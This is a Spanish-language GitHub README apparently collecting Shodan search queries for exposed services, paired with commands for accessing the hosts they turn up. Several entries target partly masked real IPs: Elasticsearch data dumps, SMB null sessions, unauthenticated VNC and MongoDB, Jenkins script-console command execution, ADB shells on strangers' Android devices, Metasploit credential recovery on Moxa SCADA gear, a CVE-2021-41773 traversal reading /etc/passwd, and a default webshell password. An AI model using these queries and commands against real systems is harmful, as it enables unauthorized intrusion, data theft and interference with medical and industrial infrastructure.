# Dorks Shodan 2023

Recopilación de Querys de shodan con scripts personalizados :)

# DICOM 
El estándar DICOM (Digital Imaging and Communications in Medicine) es un estándar utilizado en la industria médica para la gestión, almacenamiento y transmisión de imágenes médicas, como radiografías, tomografías computarizadas (TC), imágenes de resonancia magnética (IRM), entre otras.

```sh
"DICOM Server Response" port:104
```
```sh
python3 Dicom.py
```

![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/29f923e0-fbde-4526-a199-fbf71cb5319f)

![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/15e42afa-c7ba-44e0-a2fd-1c8dc6a829d5)


# Elasticsearch
Elasticsearch es un motor de búsqueda y análisis distribuido, de código abierto, basado en Lucene. Se utiliza para indexar, buscar y analizar grandes volúmenes de datos en tiempo real. Está diseñado para manejar datos no estructurados o semiestructurados y es especialmente útil para casos de uso en los que se requiere búsqueda y análisis de texto, logística, monitoreo y análisis de registros, y más

```sh
port:"9200" elastic: "Total Size:"
```
```sh
curl -X GET "http://192.x.x.153:9200/_cat/indices?v"
curl -X GET "http://192.x.x.153:9200/.monitoring-beats-7-2023.08.30"
curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
```

```sh
python3 elastic.py -t 192.x.x.153
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/25dadba2-91d2-4bc6-9a91-6c238120d557)


## Access FTP Anonymous
El acceso FTP anónimo es una forma de conectarse a un servidor FTP sin proporcionar credenciales de autenticación específicas.

```sh
"220" "230 Login successful." port:21
230 'anonymous@' login ok 
"Anonymous+access+allowed" port:"21"
```

```sh
shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt
```
```sh
python3 ftp.py -l ips.txt
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/59945aef-9d89-4c2d-bbc6-a876ad1ed68d)


# Authentication Disabled SMB
La autenticación SMB (Server Message Block) sin credenciales, también conocida como acceso SMB anónimo, permite a los usuarios acceder a recursos compartidos en una red sin proporcionar nombres de usuario ni contraseñas. Esto puede ser útil para acceder a carpetas compartidas que se han configurado para permitir el acceso anónimo.

```sh
"Authentication: disabled" port:445 product:"Samba" 
```
```sh
smbclient -L //200.x.x.29/ -N  
smbclient //200.x.x.29/info
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/da427f4b-0f7b-4f2b-9b0e-326da7e78420)

## Access authentication disabled VNC
Esto significa que el servidor VNC está configurado para permitir conexiones sin requerir autenticación.

```sh
"authentication disabled" port:5900,5901
```
```sh
vncviewer -passwd none 91.x.x.238
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e610141-1ccf-4388-92c5-c824704ca9c0)


## Access authentication disabled MongoDB
Esto significa que el servidor NoSQL MongoDB está configurado para permitir conexiones sin requerir autenticación.


```sh
"MongoDB Server Information" port:27017 -authentication
"Set-Cookie: mongo-express=" "200 OK"
```
```sh
mongo --host 139.x.x.5
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/69a9b077-8f19-4c3b-8032-0b6387c93c8b)

## Access Jenkins
Se puede visualizar componentes del servicio Jenkins, ejecutar scripts, etc.

```sh
http.component:"jenkins"
title:"Dashboard [Jenkins]"
html:"Dashboard Jenkins"
```
```sh
add /script 
print "uname -a".execute().text
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/96d36829-5013-4bdb-b543-f095a0835dc3)


## Access devices ADB
Es una aplicación de terminal que le permite conectarse al servicio ADB shell de otros dispositivos Android a través de la red.

```sh
shodan search :Android Debug Bridge port:5555 "Name:" --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt 
 ```
```sh
python3 adb.py   
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/da53ed42-de05-4842-9662-5ee57eaf6269)

```sh
adb devices
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e05b583-b684-4b27-b42d-c10b5312d788)

```sh
adb -s 59.x.x.112:5555 shell
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e2bf07c6-157a-4fac-b4e5-f317e6ced25f)

## Access devices SCADA Moxa 
Sistema SCADA que utiliza productos de la marca Moxa para establecer la conectividad y la comunicación con los dispositivos industriales que están siendo monitoreados y controlados en una infraestructura crítica o proceso industrial.

```sh
"Moxa Nport Device" Status: Authentication enabled port:"4800"
"Moxa Nport Device" Status: Authentication disabled port:"4800"
shodan search --separator , --fields ip_str,port,data "Moxa Nport" | awk '{print $1,$2,$3}' FS=":" | tr '\\', ' ' | awk '{print $1,$7,$8}' | column -t | ccze -A
```

```sh
use auxiliary/admin/scada/moxa_credentials_recovery
set FUNCTION CREDS
set rport 4800
set rhosts 212.x.x.14
run
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/54060261-80cc-4893-b134-b3fe2e0bc62c)

```sh
telnet 212.x.x.14
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5f79db0b-aff5-4790-8c9a-59f0b84c59d4)

## Exploit Infrastructure RCE CVE-2020-0796
La vulnerabilidad CVE-2020-0796 se refiere a una vulnerabilidad de ejecución de código remoto (RCE, por sus siglas en inglés) que afecta al protocolo de compartición de archivos SMBv3 (Server Message Block version 3). SMB es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes de computadoras. La versión 3 (SMBv3) es una versión moderna de este protocolo utilizada en sistemas operativos Windows.

Esta vulnerabilidad se conoció coloquialmente como "SMBGhost" o "CoronaBlue" y fue anunciada en marzo de 2020. 

```sh
vuln:CVE-2020-0796
country:pe port:445
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9719b22e-f451-41ed-8a69-c90917116eee)

![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5067e96e-1031-413b-87ed-447568d5102b)

## Exploit Web RCE CVE-2021-41773
```sh
shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/ec13f8db-9b99-4be4-af6e-5000fd99d1c9)

```sh
curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/bb853581-a88d-4f88-92b8-1e89461ee0ad)


## Electronic measure

```sh
"Server: EIG Embedded Web Server" "200 Document follows"
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e3960f20-02a7-4160-b0f5-1109b6a20995)


## Search Web shell 

```sh
html:"wso.php"
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/de293e71-053d-433a-a7a3-7f3dd9dc9d17)

webshell as default fa769dac7a0a94ee47d8ebe021eaba9e has a match password ghost287

![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/31ab5b5e-97f8-4512-b08a-76981529067a)


## Search Backup Files

```sh
html:"web.zip"
"web.zip"
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/6c0e4d42-2378-433e-a4b9-784fb7d5a5b6)


## OS Windows Obsolete
Tener sistemas Windows obsoletos y sin soporte puede conllevar una serie de peligros y riesgos significativos para la seguridad, la estabilidad y la eficiencia de tus sistemas y datos.


```sh
os:"Windows 5.0" – Windows 2000; support end 2010.
os:"Windows 5.1" – Windows XP; support end 2014.
os:"Windows 2003" – Windows Server 2003; support end 2015.
os:"Windows Vista"– Windows Vista; support end 2017.
os:"Windows 2008" – Windows Server 2008; support end 2020.
os:"Windows 7" – Windows 7; support end 2020.
os:"Windows 8" – Windows 8; support end 2016.
os:"Windows 2011" – Windows Home Server 2011; support end 2016.
os:"Windows 8.1" – Windows 8.1; support end 2018.
os:"Windows 2012" – Windows Server 2012; support end 2018.
```



